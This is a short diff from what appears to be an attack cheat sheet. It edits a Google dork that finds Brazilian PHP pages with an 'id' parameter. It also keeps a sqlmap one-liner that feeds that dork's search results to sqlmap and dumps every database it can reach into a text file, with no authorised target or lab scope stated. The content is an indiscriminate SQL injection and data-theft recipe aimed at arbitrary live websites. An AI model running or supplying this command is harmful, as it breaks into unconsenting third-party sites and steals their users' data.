@@ -2,7 +2,7 @@
 
 # parameter finding google dork
 
-    "site:.com.br inurl:.php?id=1"
+    site:.com.br inurl:.php?id=1
 
 # finding vuln parameter using google dork
     sqlmap -g "site:.com.br inurl:.php?id=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
